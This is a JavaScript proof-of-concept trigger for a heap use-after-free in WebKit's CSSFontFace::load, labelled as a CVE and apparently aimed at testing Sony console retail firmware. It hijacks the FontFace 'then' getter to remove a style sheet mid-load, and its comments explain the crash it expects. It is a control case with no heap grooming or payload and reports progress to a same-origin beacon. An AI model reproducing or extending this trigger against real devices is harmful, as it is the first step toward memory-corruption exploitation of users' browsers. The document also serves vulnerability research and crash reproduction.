// c040: CVE-2026-43715 upstream trigger, no allocations. Control case.
//
// On the ASAN build of Sony's drop this exact shape gives
//   heap-use-after-free, WRITE of size 1, CSSFontFace::setStatus (CSSFontFace.cpp:595)
// because the then-getter's style removal frees the face that CSSFontFace::load still uses.
// On retail we cannot see ASAN, so the observable is binary: if the WebProcess dies, the bug is
// live on 14.10 hardware; if the page survives and settles, it is not this path.
(function(){

function send(s){ try { navigator.sendBeacon('/beacon', 'c040-' + String(s)); } catch(e){} }
function faceOf(fam){
  var f=null; try { document.fonts.forEach(function(x){ if(String(x.family).replace(/['"]/g,'')===fam) f=x; }); } catch(e){}
  return f;
}

  send('boot');
  try {
    var v = document.createElement('style'); v.id='v'; v.textContent='x{}';
    var f = document.createElement('style'); f.id='f';
    f.textContent='@font-face { font-family: t; src: local("Arial"); }';
    document.head.appendChild(v); document.head.appendChild(f);
    document.body.offsetHeight;
    var face = faceOf('t');
    send('face=' + (face ? 'found' : 'missing'));
    if (!face) return;
    try { void face.loaded; send('read-loaded'); } catch(e){ send('loaded-threw'); }
    Object.defineProperty(FontFace.prototype, 'then', { get: function(){
      send('getter-enter');
      try { var e=document.getElementById('v'); if(e) e.remove(); send('v-removed'); } catch(err){ send('remove-threw'); }
      try { void document.body.offsetHeight; send('layout'); } catch(err){}
      send('getter-returning');
      return undefined;
    }, configurable: true });
    send('calling-load');
    face.load();
    send('load-returned');
    setTimeout(function(){ send('ALIVE-2s'); }, 2000);
  } catch(e){ send('outer:' + e.name); }
})();
